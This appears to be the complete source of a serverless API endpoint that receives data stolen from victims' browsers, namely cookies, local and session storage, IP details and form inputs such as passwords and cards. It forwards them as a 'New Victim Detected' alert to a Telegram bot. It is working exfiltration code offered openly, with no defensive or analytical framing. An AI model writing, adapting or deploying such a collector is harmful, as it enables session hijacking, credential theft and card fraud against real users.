export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    let data;
    
    // Handle different payload formats
    if (req.body && typeof req.body === 'object') {
      data = req.body;
    } else {
      // Fallback for raw byte streams (sometimes sent by sendBeacon)
      try {
        const raw = req.rawBody || req.body;
        data = JSON.parse(raw);
      } catch (e) {
        data = {};
      }
    }

    // Format LocalStorage nicely for Telegram
    const lsStr = JSON.stringify(data.localStorage, null, 2).substring(0, 1000);
    const ssStr = JSON.stringify(data.sessionStorage, null, 2).substring(0, 1000);
    
    // Format Forms (Passwords/Cards)
    const formsStr = data.forms ? data.forms.map(f => 
      `Form: ${f.action} (${f.method})\nInputs: ${JSON.stringify(f.inputs)}`
    ).join('\n---\n') : "No Forms Detected";

    const message = `
🔓 *New Victim Detected*

🆔 IP: \`${data.ip}\`
🌐 URL: ${data.location}
🖥️ UA: ${data.userAgent.substring(0, 60)}...
💻 Platform: ${data.platform}
🍪 Cookies: \`${data.cookies || "N/A"}\`
💾 LocalStorage: \`${lsStr}\`
🗄️ SessionStorage: \`${ssStr}\`
📝 Forms/Data: \`${formsStr.substring(0, 1000)}\`
📱 Screen: ${data.screenRes || "N/A"}
    `.trim();

    const tgToken = process.env.TELEGRAM_BOT_TOKEN;
    const tgChatId = process.env.TELEGRAM_CHAT_ID;

    if (tgToken && tgChatId) {
      try {
        await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: tgChatId, 
            text: message, 
            parse_mode: 'Markdown' 
          })
        });
      } catch (err) {
        console.error("TG Send Failed", err);
      }
    }

    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
}
